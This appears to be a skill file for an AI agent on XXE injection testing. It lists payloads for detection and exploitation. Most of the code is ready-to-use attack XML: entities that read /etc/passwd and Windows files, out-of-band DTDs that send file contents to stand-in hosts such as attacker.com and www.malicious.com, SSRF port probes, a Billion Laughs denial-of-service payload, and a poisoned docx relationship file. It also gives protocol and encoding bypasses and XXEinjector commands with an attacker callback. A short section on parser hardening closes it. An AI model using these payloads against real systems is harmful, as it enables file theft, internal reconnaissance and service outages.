---
name: xxe-testing
description: Professional skills and methodology for XXE XML External Entity injection testing
version: 1.0.0
---

# XXE XML External Entity Injection Testing

## Overview

XXE (XML External Entity) injection is a vulnerability that exploits XML parsers processing external entities. This skill provides methods for detecting, exploiting, and protecting against XXE vulnerabilities.

## Vulnerability Principle

XML parsers, when processing external entities, may read local files, perform SSRF attacks, or cause denial of service. Commonly found in:
- XML document parsing
- SOAP services
- Office documents (.docx, .xlsx, etc.)
- SVG images
- PDF files

## Testing Methods

### 1. Identify XML Input Points

- File upload functionality
- API interfaces that accept XML data
- SOAP requests
- Office document processing
- Data import functionality

### 2. Basic XXE Detection

**Test external entities:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Test network requests (SSRF):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/">
]>
<foo>&xxe;</foo>
```

### 3. Blind XXE Detection

**When response does not directly display content:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/?file=/etc/passwd">
]>
<foo>&xxe;</foo>
```

**Using parameter entities:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

**evil.dtd content:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?%file;'>">
%eval;
%exfil;
```

## Exploitation Techniques

### File Reading

**Read local files:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

**Windows paths:**
```xml
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
```

### SSRF Attack

**Internal network probing:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<foo>&xxe;</foo>
```

**Port scanning:**
```xml
<!ENTITY xxe SYSTEM "http://127.0.0.1:22">
<!ENTITY xxe SYSTEM "http://127.0.0.1:3306">
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379">
```

### Denial of Service

**Billion Laughs attack:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<foo>&lol9;</foo>
```

### Office Document XXE

**docx file structure:**
```
word/document.xml - Contains document content
word/_rels/document.xml.rels - Contains external references
```

**Modify document.xml.rels:**
```xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships>
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="file:///etc/passwd" TargetMode="External"/>
</Relationships>
```

## Bypass Techniques

### Different Protocols

**PHP:**
```xml
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
```

**Java:**
```xml
<!ENTITY xxe SYSTEM "jar:file:///path/to/file.zip!/file.txt">
```

**Encoding bypass:**
```xml
<!ENTITY xxe SYSTEM "file:///%65%74%63/%70%61%73%73%77%64">
```

### Parameter Entities

**Use parameter entities to bypass certain restrictions:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
]>
<foo>test</foo>
```

## Tool Usage

### XXEinjector

```bash
# Basic usage
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml

# File reading
ruby XXEinjector.rb --host=target.com --path=/api --file=request.xml --oob=http://attacker.com --path=/etc/passwd
```

### Burp Suite

1. Intercept requests containing XML
2. Send to Repeater
3. Modify XML content, add external entities
4. Observe response or out-of-band data

## Validation and Reporting

### Validation Steps

1. Confirm the XML parser processes external entities
2. Verify file reading or SSRF success
3. Assess impact scope (sensitive files, internal network access, etc.)
4. Document complete POC

### Reporting Key Points

- Vulnerability location and XML input point
- Files that can be read or internal network resources accessible
- Complete exploitation steps and PoC
- Remediation recommendations (disable external entities, use whitelist, etc.)

## Protective Measures

### Recommended Solutions

1. **Disable External Entities**
   ```java
   // Java
   DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
   dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
   dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
   dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
   ```

2. **Use Whitelist Validation**
   - Validate XML structure
   - Restrict allowed entities

3. **Use Secure Parsers**
   - Use parsers that do not process DTD
   - Use JSON instead of XML

## Notes

- Only perform testing in authorized test environments
- Avoid reading sensitive files causing data leakage
- Be aware of XXE handling differences across languages and libraries
- Be mindful of file format when testing Office documents
